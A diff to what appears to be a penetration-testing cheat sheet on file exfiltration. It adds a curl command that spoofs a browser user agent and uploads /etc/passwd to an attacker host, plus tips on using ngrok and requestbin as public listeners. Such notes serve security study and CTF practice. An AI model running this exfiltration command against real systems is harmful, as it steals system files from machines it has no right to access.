@@ -151,14 +151,15 @@ Uploading files with POST requests can be achieved in a variety of ways:
 
 ```sh
 # curl
-TODO
-
-# python 2
-TODO
-
-# python 3
-TODO
+curl -vv -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -F 'f=@/etc/passwd' http://exfil-server.com:8888
 ```
+
+#### Tunnelling Over the Public Internet
+
+Sometimes you can't communicate directly back to your attack machine from the target, but the target *can* touch the public internet. The following services will come in handy for quickly setting up listeners on the public internet:
+
+* [ngrok](https://ngrok.com/): Free service that lets you expose HTTP and TCP ports on your machine on an `*.ngrok.io` domain on the public web. Probably the best option in this list.
+* [requestbin](http://requestbin.net/): Free service for receiving HTTP requests. More useful for SSRF or XSS challenges where you do not need to control the application server talking back to the target. This site also provides [dnsbin](http://requestbin.net/dns).
 
 ### FTP File Exfiltration
 
